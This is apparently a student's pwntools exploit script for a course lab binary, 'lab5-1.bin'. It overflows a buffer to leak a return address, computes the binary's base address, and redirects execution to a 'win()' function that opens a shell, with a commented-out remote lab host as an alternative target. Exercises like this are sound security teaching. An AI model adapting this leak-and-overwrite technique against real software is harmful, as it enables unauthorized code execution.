from pwn import *

# Set CPU context architecture
context.arch = "amd64"

# Launch exploit process
p = gdb.debug("./lab5-1.bin")            # run exploit against binary locally with process attached to gdb
#p = process("./lab5-1.bin")              # run exploit against binary locally without attacking the process to gdb
#p = remote("csc748.hostbin.org", 7051)   # run the exploit against a remote process

LEAKED_OFFSET = 0x13c7
WINFUNC_OFFSET = 0x1269

# Send RIP leakage exploit bytes and Read output padding and  do nothing with them
p.send(b"A"*8 + b"B"*8 + b"C"*7 + b"\n")
p.recvuntil("\n")
print("\n")

# Read 6 bytes of RIP fix the last 2 bytes and print
LEAKED_RIP = p.recv(6) + b"\x00\x00"
print("The leaked RIP instruction in hexdump is: ", (hexdump(LEAKED_RIP)))
print("\n")

# Calculate and print the base address of the binary
LEAKED_RIP = u64(LEAKED_RIP)
BASE_ADDR = LEAKED_RIP - LEAKED_OFFSET
print("The leaked RIP instruction in base16 zero padded format: {:016x}".format(LEAKED_RIP))
print("\n")
print("The calculated base address of the binary in base16 zero padded format: {:016x})".format(BASE_ADDR))
print("\n")

# Calculate and print the address of "win()" function
WIN_ADDR = BASE_ADDR + WINFUNC_OFFSET
print("The calculated address of the 'win()' function in base16 zero padded format: {:016x})".format(WIN_ADDR))
print("\n")

# Send exploit payload to change RIP to point to "win()" function to gain shell
p.send(b"A"*8 + b"B"*8 + b"C"*8 + p64(WIN_ADDR))

# Send a NULL byte to exit the "read()" loop and execute the call to "win()" function
p.send(b"\x00")

# Swicth to interactive shell after successful exploit
p.interactive()
